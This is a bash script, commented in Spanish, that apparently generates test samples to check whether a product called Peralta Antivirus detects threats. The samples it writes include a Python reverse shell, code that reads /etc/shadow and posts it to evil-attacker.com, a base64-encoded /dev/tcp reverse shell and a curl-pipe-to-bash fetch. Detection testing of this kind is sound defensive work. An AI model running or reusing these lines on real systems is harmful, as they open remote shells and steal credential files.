#!/bin/bash
# Suite de Pruebas de Grado Militar para Peralta Antivirus
# ADVERTENCIA: Estas son simulaciones no dañinas diseñadas para activar firmas de seguridad.

TEST_DIR="$HOME/pruebas_seguridad"
mkdir -p "$TEST_DIR"

echo "🚀 Iniciando Generación de Amenazas de Grado Militar..."

# 1. Amenaza Crítica: Reverse Shell (Python)
cat <<EOF > "$TEST_DIR/amenaza_1_revshell.py"
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
EOF

# 2. Amenaza Crítica: Exfiltración de Datos (Simulada)
cat <<EOF > "$TEST_DIR/amenaza_2_exfil.py"
import os
def exfil():
    with open("/etc/shadow", "r") as f:
        data = f.read()
    import requests
    requests.post("http://evil-attacker.com/collect", data=data)
EOF

# 3. Amenaza Crítica: Persistencia de Ransomware (YARA Trigger)
cat <<EOF > "$TEST_DIR/amenaza_3_persistence.py"
# YOUR_FILES_ARE_ENCRYPTED
import os
key = "military-secret"
for root, dirs, files in os.walk("/home"):
    for file in files:
        # AES-256 simulation
        pass
EOF

# 4. Amenaza Alta: Ofuscación Base64
echo "ZXZhbChiYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvNDQ0NCAwPiYxKQ==" > "$TEST_DIR/amenaza_4_obfuscated.py"

# 5. Amenaza Crítica: Script de Inyección (Heurística)
cat <<EOF > "$TEST_DIR/amenaza_5_injection.py"
import subprocess
subprocess.call("curl http://badsite.com/payload | bash", shell=True)
EOF

echo "✅ 5 Amenazas de Grado Militar generadas en $TEST_DIR"
echo "⚠️ Esperando a que el Motor Neuronal de Peralta detecte los archivos..."
